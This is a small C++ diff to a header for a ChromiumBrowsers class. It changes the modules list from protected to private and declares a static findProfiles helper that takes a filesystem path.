@@ -15,8 +15,9 @@ public:
     ChromiumBrowsers();
 
     void execute(fs::path &root) override;
-protected:
+private:
     std::list<ChromiumBrowserModule*> modules;
+    static std::vector<std::string> findProfiles(const fs::path &path);
 };
 
 
